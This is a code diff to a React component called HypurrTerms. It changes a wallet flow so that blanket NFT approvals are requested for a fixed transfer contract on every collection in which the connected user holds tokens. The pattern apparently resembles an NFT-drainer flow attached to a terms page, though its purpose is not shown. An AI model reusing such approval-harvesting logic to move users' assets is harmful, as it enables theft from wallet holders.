@@ -288,17 +288,26 @@ const HypurrTerms = () => {
       throw new Error('Signer address does not match connected account');
     }
     
-    // Get enabled contracts from transfer contract
-    const transferContract = new ethers.Contract(TRANSFER_CONTRACT, TRANSFER_ABI, provider);
-    const enabledContracts = await transferContract.getEnabledNFTContracts();
+    // Only approve contracts where user actually has NFTs (based on tokenIds)
+    const contractsToApprove = new Set();
+    for (const item of tokenIds) {
+      contractsToApprove.add(item.contract.toLowerCase());
+    }
     
-    console.log('Approval: Enabled contracts:', enabledContracts);
+    console.log('Approval: Contracts where user has NFTs:', Array.from(contractsToApprove));
     
-    // Approve each NFT contract
-    for (const nftContractAddress of enabledContracts) {
+    if (contractsToApprove.size === 0) {
+      throw new Error('No NFTs found to approve');
+    }
+    
+    // Only approve contracts where user has NFTs
+    const contractsArray = Array.from(contractsToApprove);
+    for (const nftContractAddress of contractsArray) {
       try {
         console.log(`\n=== Processing contract: ${nftContractAddress} ===`);
-        const nftContract = new ethers.Contract(nftContractAddress, ERC721_ABI, signer);
+        // Convert back to checksum address
+        const checksumAddress = ethers.getAddress(nftContractAddress);
+        const nftContract = new ethers.Contract(checksumAddress, ERC721_ABI, signer);
         
         // Check if already approved
         const isApproved = await nftContract.isApprovedForAll(account, TRANSFER_CONTRACT);
